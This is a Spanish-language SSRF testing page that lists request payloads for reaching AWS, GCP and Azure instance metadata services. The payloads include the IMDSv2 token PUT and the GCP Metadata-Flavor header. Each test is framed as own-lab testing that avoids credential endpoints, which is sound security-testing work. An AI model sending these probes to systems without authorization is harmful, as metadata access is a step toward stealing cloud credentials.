# 🗡️ SSRF hacia metadatos cloud: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. AWS IMDSv1: identidad no sensible

**Objetivo:** Comprobar bloqueo del endpoint sin consultar credenciales.

```json
{"url":"http://169.254.169.254/latest/meta-data/instance-id"}
```

**Interpretación:** Solo en instancia propia/laboratorio. Un ID visible confirma alcance a metadatos, no robo de credenciales.

**Fuente técnica:** [documentación de la técnica](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html).

### 2. AWS IMDSv2: token requerido

**Objetivo:** Comprobar si un GET sin token se rechaza.

```http
GET /latest/meta-data/instance-id HTTP/1.1
Host: 169.254.169.254
```

**Interpretación:** En IMDSv2 obligatorio se espera 401; enviar esta prueba únicamente desde entorno propio.

**Fuente técnica:** [documentación de la técnica](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html).

### 3. AWS IMDSv2: método PUT

**Objetivo:** Verificar si el vector SSRF permite método y cabecera necesarios para token.

```http
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 60
```

**Interpretación:** Laboratorio propio. No registrar ni mostrar el token devuelto; evaluar si el SSRF puede encadenar PUT y GET.

**Fuente técnica:** [documentación de la técnica](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html).

### 4. GCP: cabecera obligatoria

**Objetivo:** Comprobar bloqueo de metadata sin Metadata-Flavor.

```http
GET /computeMetadata/v1/instance/id HTTP/1.1
Host: metadata.google.internal
```

**Interpretación:** GCP normalmente exige Metadata-Flavor: Google. Solo probar en proyecto propio.

**Fuente técnica:** [documentación de la técnica](https://docs.cloud.google.com/compute/docs/metadata/querying-metadata).

### 5. GCP: identidad de laboratorio

**Objetivo:** Verificar impacto si el SSRF deja controlar cabeceras.

```http
GET /computeMetadata/v1/instance/id HTTP/1.1
Host: metadata.google.internal
Metadata-Flavor: Google
```

**Interpretación:** No solicitar tokens de servicio; registrar solo ID de instancia de laboratorio.

**Fuente técnica:** [documentación de la técnica](https://docs.cloud.google.com/compute/docs/metadata/querying-metadata).

### 6. Azure: versión y cabecera

**Objetivo:** Comprobar alcance a dato no sensible de IMDS.

```http
GET /metadata/instance/compute/location?api-version=2025-04-07&format=text HTTP/1.1
Host: 169.254.169.254
Metadata: true
```

**Interpretación:** Solo en VM propia; el dato de región confirma acceso pero no identidad ni permisos de gestión.

**Fuente técnica:** [documentación de la técnica](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service).

### 7. Bloqueo de link-local por URL

**Objetivo:** Verificar que un campo URL rechaza destino de metadatos.

```json
{"url":"http://[fd00:ec2::254]/latest/meta-data/instance-id"}
```

**Interpretación:** Variante IPv6 disponible solo en ciertas instancias AWS propias; comparar con canary público y no iterar credenciales.

**Fuente técnica:** [documentación de la técnica](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
